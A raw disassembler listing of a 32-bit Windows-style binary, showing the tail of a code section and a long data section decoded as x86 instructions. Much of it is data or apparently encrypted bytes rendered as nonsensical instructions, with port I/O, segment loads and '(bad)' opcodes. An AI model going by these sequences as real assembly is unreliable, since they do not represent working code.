  4113a3:	ds ret 0x2a39
  4113a7:	in     eax,0x17
  4113a9:	adc    edx,DWORD PTR [ebx-0x275ff8cc]
  4113af:	mov    eax,ds:0xe3d1d5e3
  4113b4:	add    DWORD PTR [esi],ecx
  4113b6:	and    DWORD PTR ds:0xa0b94bdc,0xa1c701be
  4113c0:	shr    BYTE PTR [eax+0x7dbf224],1
  4113c6:	js     0x411354
  4113c8:	cmc    
  4113c9:	xor    cl,dl
  4113cb:	xor    cl,BYTE PTR [edi]
  4113cd:	out    dx,al
  4113ce:	aas    
  4113cf:	mov    esp,DWORD PTR [ebx+edi*1+0x42]
  4113d3:	fstp   TBYTE PTR [ebx]
  4113d5:	data16 aam 0x28
  4113d8:	and    esp,ebx
  4113da:	imul   ecx,edx,0xffffff9e
  4113dd:	mov    ebx,0xc695dca
  4113e2:	mov    esi,0xda4a55a0
  4113e7:	sub    eax,0x8806c50f
  4113ec:	mov    bh,0xe6
  4113ee:	sti    
  4113ef:	mov    esp,0x33a7c449
  4113f4:	inc    edi
  4113f5:	out    0x6a,eax
  4113f7:	push   ebp
  4113f8:	retf   
  4113f9:	ror    DWORD PTR [ebx],0xca
  4113fc:	ret    0x69c0
  4113ff:	and    ecx,DWORD PTR [edx+0xe3932c0]
  411405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411406:	dec    esp
  411407:	stc    
  411408:	mov    ds:0x8f9f482f,eax
  41140d:	mov    dl,0x74
  41140f:	out    dx,al
  411410:	dec    ebx
  411411:	cmp    DWORD PTR [esi+0xc312fbc],esi
  411417:	xchg   ecx,eax
  411418:	inc    esp
  411419:	xor    edx,DWORD PTR [eax+eiz*8+0x2dc032c3]
  411420:	pop    ss
  411421:	cmp    dh,bl
  411423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411424:	jp     0x411443
  411426:	push   esp
  411427:	pop    es
  411428:	mov    esp,0x79dcb178
  41142d:	mov    bl,0x41
  41142f:	dec    eax
  411430:	out    0xc1,eax
  411432:	stc    
  411433:	jp     0x411433
  411435:	inc    edx
  411436:	push   0x23497dc5
  41143b:	test   BYTE PTR [eax-0x1b7c057e],ch
  411441:	jnp    0x41141f
  411443:	ret    
  411444:	data16 data16 mov BYTE PTR [esi],dl
  411448:	mov    cs,si
  41144b:	imul   edx,DWORD PTR [esi+0x50],0x4c
  41144f:	push   ss
  411450:	int    0x82
  411452:	jns    0x411474
  411454:	ins    DWORD PTR es:[edi],dx
  411455:	ins    BYTE PTR es:[edi],dx
  411456:	push   edx
  411457:	lds    edx,FWORD PTR [esi-0x3012a5d3]
  41145d:	add    DWORD PTR [esi],ebp
  41145f:	scas   eax,DWORD PTR es:[edi]
  411460:	push   eax
  411461:	jne    0x411479
  411463:	(bad)  
  411464:	mov    dl,0x60
  411466:	dec    ecx
  411467:	repz inc esi
  411469:	call   0xd66afdf3
  41146e:	jl     0x41148b
  411470:	xchg   ecx,eax
  411471:	jbe    0x411466
  411473:	shl    DWORD PTR [esi-0x63454332],0xad
  41147a:	jne    0x4114af
  41147c:	xchg   BYTE PTR [ebx],ah
  41147e:	dec    edx
  41147f:	inc    ebx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    DWORD PTR [ebx],eax
  412423:	add    BYTE PTR [edx],bh
  412425:	and    eax,DWORD PTR [ebx]
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
